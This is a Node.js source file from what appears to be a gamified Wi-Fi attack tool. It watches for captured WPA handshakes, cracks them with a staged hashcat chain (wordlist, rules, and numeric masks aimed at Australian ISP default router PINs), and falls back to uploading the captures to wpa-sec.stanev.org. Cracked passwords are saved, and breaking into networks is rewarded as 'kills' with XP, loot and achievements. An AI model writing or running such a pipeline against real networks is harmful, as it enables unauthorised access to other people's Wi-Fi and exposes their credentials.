const chokidar = require('chokidar');
const { exec } = require('child_process');
const path = require('path');
const fs = require('fs');
const https = require('https');
const db = require('./db');
const { rollLoot, addXP, checkAchievements, logEvent } = require('./game-engine');
const { narrate } = require('./narrator');

const HANDSHAKE_DIR = path.join(__dirname, 'handshakes');
const CRACKED_DIR   = path.join(__dirname, 'cracked');
const HASHCAT_BIN   = 'C:\\tools\\hashcat\\hashcat-7.1.2\\hashcat.exe';
const RULES_DIR     = 'C:\\tools\\hashcat\\hashcat-7.1.2\\rules';
const WORDLIST      = 'C:\\wordlists\\rockyou.txt';

// wpa-sec.stanev.org integration — set WPA_SEC_KEY env var to enable
const WPA_SEC_KEY = process.env.WPA_SEC_KEY || null;

let eventEmitter = null;

function setEmitter(emitter) { eventEmitter = emitter; }

function broadcast(type, data) {
  if (eventEmitter) eventEmitter.emit(type, data);
}

// ── Hashcat multi-stage attack chain ─────────────────────────────────────────

function runHashcat(args, timeoutMs = 300000) {
  return new Promise((resolve) => {
    exec(`"${HASHCAT_BIN}" ${args.join(' ')}`, { timeout: timeoutMs }, (err) => resolve(err));
  });
}

function readPot(potFile) {
  if (!fs.existsSync(potFile)) return null;
  const pot = fs.readFileSync(potFile, 'utf8').trim();
  if (!pot) return null;
  // pot format: hash:password  — last colon-separated field is the password
  const lines = pot.split('\n').filter(Boolean);
  if (!lines.length) return null;
  const parts = lines[0].split(':');
  return parts[parts.length - 1];
}

async function crackWithHashcat(capFile, bssid) {
  if (!fs.existsSync(WORDLIST)) {
    console.log('[CRACK] rockyou.txt not found at C:\\wordlists\\. Skipping hashcat.');
    return null;
  }

  const safeId  = bssid.replace(/:/g, '');
  const potFile = path.join(CRACKED_DIR, `${safeId}.pot`);
  const base    = ['-m', '22000', capFile, '--potfile-path', potFile, '--quiet'];

  // Stage 1: plain wordlist
  console.log(`[CRACK] Stage 1 — wordlist: ${path.basename(WORDLIST)}`);
  await runHashcat([...base, WORDLIST]);
  let pw = readPot(potFile);
  if (pw) { console.log(`[CRACK] Stage 1 cracked!`); return pw; }

  // Stage 2: wordlist + best66 rules
  const rulesFile = path.join(RULES_DIR, 'best66.rule');
  if (fs.existsSync(rulesFile)) {
    console.log('[CRACK] Stage 2 — wordlist + best66.rule');
    await runHashcat([...base, WORDLIST, '-r', rulesFile]);
    pw = readPot(potFile);
    if (pw) { console.log(`[CRACK] Stage 2 cracked!`); return pw; }
  }

  // Stage 3: 8-digit numeric mask (AU ISP default PINs: Telstra, Optus, TPG routers)
  console.log('[CRACK] Stage 3 — 8-digit numeric mask (AU ISP)');
  await runHashcat([...base, '-a', '3', '?d?d?d?d?d?d?d?d'], 120000);
  pw = readPot(potFile);
  if (pw) { console.log(`[CRACK] Stage 3 cracked!`); return pw; }

  // Stage 4: 10-digit numeric mask (some AU ISP serial-number PINs)
  console.log('[CRACK] Stage 4 — 10-digit numeric mask');
  await runHashcat([...base, '-a', '3', '?d?d?d?d?d?d?d?d?d?d'], 120000);
  pw = readPot(potFile);
  if (pw) { console.log(`[CRACK] Stage 4 cracked!`); return pw; }

  return null;
}

// ── wpa-sec.stanev.org integration ───────────────────────────────────────────

function wpaSecUpload(capFile) {
  return new Promise((resolve, reject) => {
    const fileData = fs.readFileSync(capFile);
    const boundary = '----WpaSec' + Date.now();
    const body = Buffer.concat([
      Buffer.from(`--${boundary}\r\nContent-Disposition: form-data; name="file"; filename="${path.basename(capFile)}"\r\nContent-Type: application/octet-stream\r\n\r\n`),
      fileData,
      Buffer.from(`\r\n--${boundary}--\r\n`),
    ]);
    const opts = {
      hostname: 'wpa-sec.stanev.org',
      path: '/?submit',
      method: 'POST',
      headers: {
        'Cookie': `key=${WPA_SEC_KEY}`,
        'Content-Type': `multipart/form-data; boundary=${boundary}`,
        'Content-Length': body.length,
      },
    };
    const req = https.request(opts, (res) => {
      let out = '';
      res.on('data', c => out += c);
      res.on('end', () => resolve(out));
    });
    req.on('error', reject);
    req.write(body);
    req.end();
  });
}

function wpaSecFetch() {
  return new Promise((resolve, reject) => {
    const opts = {
      hostname: 'wpa-sec.stanev.org',
      path: '/?api&dl=1',
      method: 'GET',
      headers: { 'Cookie': `key=${WPA_SEC_KEY}` },
    };
    const req = https.request(opts, (res) => {
      let out = '';
      res.on('data', c => out += c);
      res.on('end', () => resolve(out));
    });
    req.on('error', reject);
    req.end();
  });
}

async function crackViaWpaSec(capFile, bssid) {
  if (!WPA_SEC_KEY) return null;
  try {
    console.log('[CRACK] Stage 5 — uploading to wpa-sec.stanev.org');
    await wpaSecUpload(capFile);

    // Poll for up to 30 minutes (community cracking takes time)
    const normalBssid = bssid.toLowerCase();
    for (let attempt = 0; attempt < 30; attempt++) {
      await new Promise(r => setTimeout(r, 60000));
      console.log(`[CRACK] wpa-sec poll ${attempt + 1}/30...`);
      const csv = await wpaSecFetch();
      // CSV format: BSSID,ESSID,PASSWORD
      for (const line of csv.split('\n')) {
        const parts = line.split(':');
        if (parts.length >= 3 && parts[0].toLowerCase() === normalBssid) {
          const pw = parts.slice(2).join(':');
          console.log(`[CRACK] wpa-sec cracked!`);
          return pw;
        }
      }
    }
    console.log('[CRACK] wpa-sec: no result after 30 minutes');
  } catch (e) {
    console.warn(`[CRACK] wpa-sec error: ${e.message}`);
  }
  return null;
}

// ── Handshake processing ──────────────────────────────────────────────────────

async function processHandshake(capFile) {
  const filename = path.basename(capFile, path.extname(capFile));
  // Filename: BSSID_SSID.cap  (e.g. aa-bb-cc-dd-ee-ff_MyNetwork.cap)
  const parts = filename.split('_');
  const bssid = parts[0].replace(/-/g, ':');
  const ssid  = parts.slice(1).join('_');

  console.log(`[CRACK] Processing: ${ssid} (${bssid})`);

  const monster = db.prepare('SELECT * FROM monsters WHERE bssid=?').get(bssid);
  if (!monster) console.log(`[CRACK] No monster record for ${bssid}, skipping game events`);

  db.prepare(`UPDATE monsters SET handshake_captured=1, status='wounded' WHERE bssid=?`).run(bssid);

  const handshakeMsg = await narrate('handshake', {
    ssid, monsterType: monster?.monster_type || 'Unknown Horror',
  });
  logEvent('handshake', handshakeMsg, { bssid, ssid });
  broadcast('event', { type: 'handshake', message: handshakeMsg, bssid, ssid });

  // Multi-stage local cracking
  let password = await crackWithHashcat(capFile, bssid);

  // Community cracking fallback (requires WPA_SEC_KEY env var)
  if (!password) password = await crackViaWpaSec(capFile, bssid);

  if (password) {
    await handleKill(bssid, ssid, password, monster);
  } else {
    const failMsg = await narrate('crack_fail', { ssid, monsterType: monster?.monster_type || 'Unknown' });
    logEvent('crack_fail', failMsg, { bssid, ssid });
    broadcast('event', { type: 'crack_fail', message: failMsg, bssid, ssid });
  }

  const dest = path.join(CRACKED_DIR, path.basename(capFile));
  try { fs.renameSync(capFile, dest); } catch {}
}

async function handleKill(bssid, ssid, password, monster) {
  db.prepare(`UPDATE monsters SET cracked=1, status='dead', password=? WHERE bssid=?`).run(password, bssid);
  db.prepare('UPDATE crawler SET kills=kills+1 WHERE id=1').run();

  const xpGain = monster?.xp_value || 200;
  const { level, leveled } = addXP(xpGain);

  const killMsg = await narrate('kill', { ssid, monsterType: monster?.monster_type || 'Unknown Horror', password });
  logEvent('kill', killMsg, { bssid, ssid, password, xp: xpGain });
  broadcast('event', { type: 'kill', message: killMsg, bssid, ssid, password, xp: xpGain });

  const loot = rollLoot(monster?.monster_type, ssid);
  db.prepare('INSERT INTO loot (monster_bssid, item_name, item_type, rarity, flavor_text) VALUES (?,?,?,?,?)')
    .run(bssid, loot.name, loot.type, loot.rarity, loot.flavor);

  const lootMsg = await narrate('loot', { itemName: loot.name, rarity: loot.rarity, flavor: loot.flavor });
  logEvent('loot', lootMsg, { item: loot });
  broadcast('event', { type: 'loot', message: lootMsg, item: loot });

  if (leveled) {
    const lvlMsg = await narrate('level_up', { level });
    logEvent('level_up', lvlMsg, { level });
    broadcast('event', { type: 'level_up', message: lvlMsg, level });
  }

  const enc = (monster?.encryption || '').toLowerCase();
  const achievementChecks = [];
  const totalKills = db.prepare('SELECT kills FROM crawler WHERE id=1').get().kills;

  if (totalKills === 1) achievementChecks.push('first_blood');
  if (totalKills >= 100) achievementChecks.push('century');
  if (enc.includes('wep')) achievementChecks.push('goblin_slayer');
  if (enc.includes('wpa') && !enc.includes('wpa2') && !enc.includes('wpa3')) achievementChecks.push('troll_hunter');
  if (enc.includes('wpa2')) achievementChecks.push('dragon_hunter');
  if (enc.includes('wpa3')) achievementChecks.push('lich_king');
  if (monster?.monster_type === 'Common Peasant') achievementChecks.push('peasant_slayer');

  const totalLoot = db.prepare('SELECT COUNT(*) as c FROM loot').get().c;
  if (totalLoot >= 10) achievementChecks.push('hoarder');

  for (const code of achievementChecks) {
    const ach = checkAchievements(code);
    if (ach) {
      const achMsg = await narrate('achievement', { achievementName: ach.name, desc: ach.description });
      logEvent('achievement', achMsg, { achievement: ach });
      broadcast('event', { type: 'achievement', message: achMsg, achievement: ach });
    }
  }
}

function startWatcher() {
  console.log(`[CRACK] Watching ${HANDSHAKE_DIR} for new captures...`);
  if (WPA_SEC_KEY) {
    console.log('[CRACK] wpa-sec.stanev.org integration ENABLED');
  } else {
    console.log('[CRACK] wpa-sec disabled — set WPA_SEC_KEY env var to enable community cracking');
  }

  const watcher = chokidar.watch(HANDSHAKE_DIR, {
    ignored: /^\./,
    persistent: true,
    awaitWriteFinish: { stabilityThreshold: 2000, pollInterval: 500 },
  });

  watcher.on('add', (filePath) => {
    if (['.cap', '.pcapng', '.pcap', '.hccapx', '.22000'].includes(path.extname(filePath).toLowerCase())) {
      processHandshake(filePath);
    }
  });
}

module.exports = { startWatcher, setEmitter, handleKill };
